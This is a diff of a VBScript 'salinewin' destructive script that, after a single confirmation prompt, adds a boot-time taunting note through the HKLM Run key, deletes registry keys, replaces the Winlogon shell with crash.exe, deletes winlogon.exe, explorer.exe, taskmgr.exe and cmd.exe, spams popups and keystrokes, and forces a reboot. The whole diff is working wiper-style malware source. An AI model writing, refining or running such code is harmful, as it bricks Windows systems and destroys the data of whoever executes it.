@@ -5,7 +5,17 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 answer = MsgBox("THIS WILL DESTROY YOUR VM AND SHOW A MESSAGE ON BOOT. CONTINUE?", 36, "!!! WARNING !!!")
 If answer <> 6 Then WScript.Quit
 
-' === Registry Nuking ===
+' === Step 1: Drop boot-time message ===
+Set msgFile = fso.CreateTextFile("C:\salinewin_note.txt", True)
+msgFile.WriteLine "salinewin.exe has claimed this system."
+msgFile.WriteLine "You cannot undo this."
+msgFile.WriteLine "This machine belongs to chaos."
+msgFile.Close
+
+' Make message show on boot
+shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\salinewin_note", "notepad.exe C:\salinewin_note.txt", "REG_SZ"
+
+' === Step 2: Corrupt registry ===
 keys = Array( _
     "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer", _
     "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
@@ -18,28 +28,10 @@ For Each key In keys
     shell.RegDelete key & "\"
 Next
 
-' Break Windows shell (no explorer.exe on boot)
+' Break shell (no desktop next boot)
 shell.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "crash.exe", "REG_SZ"
 
-' === Drop persistent message file ===
-Set msgFile = fso.CreateTextFile("C:\salinewin_note.txt", True)
-msgFile.WriteLine "salinewin.exe has claimed this machine."
-msgFile.WriteLine "This system is no longer yours."
-msgFile.WriteLine "There is no escape."
-msgFile.Close
-
-' Make it open on boot
-shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\salinewin_note", "notepad.exe C:\salinewin_note.txt", "REG_SZ"
-
-' === Optional File Spam ===
-For i = 1 To 200
-    On Error Resume Next
-    Set spam = fso.CreateTextFile("C:\salinewinisgoat_" & i & ".txt", True)
-    spam.WriteLine "YOU WILL NO LONGER HAVE ACCESS TO THIS PC, IT WILL NO LONGER BOOT UP AGAIN"
-    spam.Close
-Next
-
-' === Destroy essential EXEs ===
+' === Step 3: Delete essential executables ===
 Set win = shell.ExpandEnvironmentStrings("%windir%")
 On Error Resume Next
 fso.DeleteFile(win & "\System32\winlogon.exe")
@@ -47,7 +39,12 @@ fso.DeleteFile(win & "\System32\explorer.exe")
 fso.DeleteFile(win & "\System32\taskmgr.exe")
 fso.DeleteFile(win & "\System32\cmd.exe")
 
-' === RAM spam to hang system ===
-Do
+' === Step 4: Final chaos spam ===
+For i = 1 To 10
+    shell.Popup "SALINEWIN.EXE ERROR 0x" & Hex(Int(Rnd * 999999)), 1, "salinewin.exe", 48
     shell.Run "notepad"
-Loop
+    shell.SendKeys "salinewin.exe has taken over {ENTER}"
+    WScript.Sleep 200
+Next
+
+shell.Run "shutdown -r -t 5 -c ""DESTROYING FILES!"""
